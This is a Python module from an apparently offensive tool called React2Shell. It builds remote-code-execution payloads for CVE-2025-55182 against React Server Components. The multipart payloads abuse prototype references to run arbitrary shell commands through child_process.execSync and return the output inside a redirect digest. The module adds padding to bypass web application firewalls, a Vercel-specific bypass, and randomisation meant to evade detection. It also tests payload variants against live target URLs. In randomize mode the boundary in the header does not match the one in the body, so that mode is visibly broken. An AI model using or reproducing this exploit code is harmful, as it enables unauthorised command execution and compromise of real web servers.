"""Payload building classes for React2Shell."""

import random
import string
from typing import Dict, Tuple
from threading import Lock


def generate_junk_data(size_bytes: int) -> str:
    """Generate random junk data for WAF bypass."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))


class PayloadWarmer:
    """Auto-warming payloads to pre-test and optimize payloads."""
    
    def __init__(self):
        self.warmed_payloads = {}
        self.warm_lock = Lock()
    
    def warm_payload(self, target_url: str, command: str, config: Dict) -> Dict:
        """Warm up a payload by testing variations."""
        from ..classes.executor import execute_command
        
        cache_key = f"{target_url}:{command}:{hash(str(config))}"
        
        with self.warm_lock:
            if cache_key in self.warmed_payloads:
                return self.warmed_payloads[cache_key]
        
        # Test multiple variations
        variations = [
            {"base64_encode": True, "waf_bypass": False},
            {"base64_encode": True, "waf_bypass": True, "waf_bypass_size_kb": 64},
            {"base64_encode": True, "waf_bypass": True, "waf_bypass_size_kb": 128},
            {"base64_encode": False, "waf_bypass": False},
        ]
        
        best_config = config.copy()
        best_result = None
        
        for var in variations:
            test_config = {**config, **var}
            test_result = execute_command(
                target_url,
                "echo test",
                timeout=config.get("timeout", 5),
                verify_ssl=config.get("verify_ssl", True),
                windows=config.get("windows", False),
                **{k: v for k, v in test_config.items() if k not in ["timeout", "verify_ssl", "windows"]}
            )
            
            if test_result.get("success") and not best_result:
                best_config = test_config
                best_result = test_result
                break
        
        with self.warm_lock:
            self.warmed_payloads[cache_key] = best_config
        
        return best_config


class PayloadRandomizer:
    """Dynamically randomize payloads to evade detection."""
    
    @staticmethod
    def randomize_boundary() -> str:
        """Generate random multipart boundary."""
        random_part = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        return f"----WebKitFormBoundary{random_part}"
    
    @staticmethod
    def randomize_variable_names() -> Dict[str, str]:
        """Generate random variable names for payload."""
        return {
            "var_name": ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8))),
            "error_name": ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10))),
            "digest_var": ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 12))),
        }


class PayloadBuilder:
    """Build RCE payloads for CVE-2025-55182."""
    
    @staticmethod
    def build_rce_payload(
        command: str,
        windows: bool = False,
        base64_encode: bool = True,
        waf_bypass: bool = False,
        waf_bypass_size_kb: int = 128,
        vercel_waf_bypass: bool = False,
        randomize: bool = False
    ) -> Tuple[str, str]:
        """Build RCE payload with custom command."""
        if randomize:
            boundary = PayloadRandomizer.randomize_boundary()
            vars = PayloadRandomizer.randomize_variable_names()
        else:
            boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
            vars = {"var_name": "res", "error_name": "NEXT_REDIRECT", "digest_var": "digest"}
        
        # Escape command for JSON
        escaped_cmd = command.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')
        
        if windows:
            if base64_encode:
                cmd = f'powershell -c "[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(({escaped_cmd}) -join \"`n\"))"'
            else:
                cmd = f'powershell -c "{escaped_cmd}"'
        else:
            if base64_encode:
                cmd = f'({escaped_cmd}) | base64 -w 0'
            else:
                cmd = escaped_cmd
        
        # Build the payload
        if randomize:
            prefix_payload = (
                f"var {vars['var_name']}=process.mainModule.require('child_process').execSync('{cmd}')"
                f".toString().trim();;throw Object.assign(new Error('{vars['error_name']}'),"
                f"{{digest: `{vars['error_name']};push;/login?a=${{{vars['var_name']}}};307;`}});"
            )
        else:
            prefix_payload = (
                f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
                f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
                f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
            )
        
        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        if vercel_waf_bypass:
            part0 = (
                '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
                '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
                + prefix_payload
                + '","_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}'
            )
        
        parts = []
        
        if waf_bypass:
            param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
            junk = generate_junk_data(waf_bypass_size_kb * 1024)
            parts.append(
                f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
                f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
                f"{junk}\r\n"
            )
        
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
        )
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
        )
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
        )
        
        if vercel_waf_bypass:
            parts.append(
                f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
                f'Content-Disposition: form-data; name="3"\r\n\r\n'
                f'{{"\\"\u0024\u0024":{{}}}}\r\n'
            )
        
        parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")
        
        body = "".join(parts)
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type

